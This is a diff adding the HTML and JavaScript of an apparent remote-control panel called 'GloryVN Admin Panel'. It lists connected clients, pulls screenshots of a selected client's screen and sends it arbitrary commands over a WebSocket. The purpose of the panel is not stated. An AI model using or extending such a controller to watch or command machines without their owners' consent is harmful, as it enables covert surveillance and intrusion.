@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>GloryVN Admin Panel</title>
+
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #0f172a;
+            color: white;
+            display: flex;
+            height: 100vh;
+        }
+
+        /* Sidebar */
+        .sidebar {
+            width: 250px;
+            background-color: #111827;
+            padding: 20px;
+            border-right: 1px solid #1f2937;
+        }
+
+        .sidebar h2 {
+            margin-top: 0;
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
+
+        .client {
+            padding: 10px;
+            background-color: #1f2937;
+            margin-bottom: 8px;
+            cursor: pointer;
+            border-radius: 6px;
+            transition: 0.2s;
+        }
+
+        .client:hover {
+            background-color: #374151;
+        }
+
+        .client.active {
+            background-color: #2563eb;
+        }
+
+        /* Main */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .topbar {
+            padding: 15px;
+            border-bottom: 1px solid #1f2937;
+            display: flex;
+            gap: 10px;
+        }
+
+        button {
+            padding: 8px 14px;
+            background-color: #2563eb;
+            border: none;
+            color: white;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #1d4ed8;
+        }
+
+        input {
+            padding: 8px;
+            border-radius: 6px;
+            border: none;
+            outline: none;
+            width: 250px;
+        }
+
+        .viewer {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #0b1220;
+        }
+
+        img {
+            max-width: 95%;
+            max-height: 95%;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+
+        .status {
+            font-size: 13px;
+            opacity: 0.6;
+        }
+    </style>
+</head>
+<body>
+
+<div class="sidebar">
+    <h2>Clients Online</h2>
+    <div id="clientList"></div>
+</div>
+
+<div class="main">
+    <div class="topbar">
+        <button onclick="requestScreenshot()">📸 Screenshot</button>
+
+        <input type="text" id="commandInput" placeholder="Nhập command...">
+        <button onclick="sendCommand()">🚀 Send</button>
+
+        <div class="status" id="status">Disconnected</div>
+    </div>
+
+    <div class="viewer">
+        <img id="screen" src="">
+    </div>
+</div>
+
+<script>
+    let selectedClient = null;
+    const ws = new WebSocket(`ws://${location.host}/ws/admin`);
+
+    const clientListDiv = document.getElementById("clientList");
+    const screenImg = document.getElementById("screen");
+    const statusText = document.getElementById("status");
+
+    ws.onopen = () => {
+        statusText.innerText = "Connected";
+    };
+
+    ws.onclose = () => {
+        statusText.innerText = "Disconnected";
+    };
+
+    ws.onmessage = (event) => {
+        const data = JSON.parse(event.data);
+
+        if (data.type === "clients") {
+            renderClients(data.clients);
+        }
+
+        if (data.type === "screenshot") {
+            if (data.client_id === selectedClient) {
+                screenImg.src = "data:image/jpeg;base64," + data.image;
+            }
+        }
+    };
+
+    function renderClients(clients) {
+        clientListDiv.innerHTML = "";
+
+        clients.forEach(id => {
+            const div = document.createElement("div");
+            div.className = "client";
+            div.innerText = id;
+
+            div.onclick = () => {
+                document.querySelectorAll(".client")
+                    .forEach(c => c.classList.remove("active"));
+
+                div.classList.add("active");
+                selectedClient = id;
+            };
+
+            clientListDiv.appendChild(div);
+        });
+    }
+
+    function requestScreenshot() {
+        if (!selectedClient) return alert("Chọn client trước!");
+
+        ws.send(JSON.stringify({
+            type: "request_screenshot",
+            client_id: selectedClient
+        }));
+    }
+
+    function sendCommand() {
+        if (!selectedClient) return alert("Chọn client trước!");
+
+        const cmd = document.getElementById("commandInput").value;
+
+        ws.send(JSON.stringify({
+            type: "command",
+            client_id: selectedClient,
+            command: cmd
+        }));
+
+        document.getElementById("commandInput").value = "";
+    }
+</script>
+
+</body>
+</html>
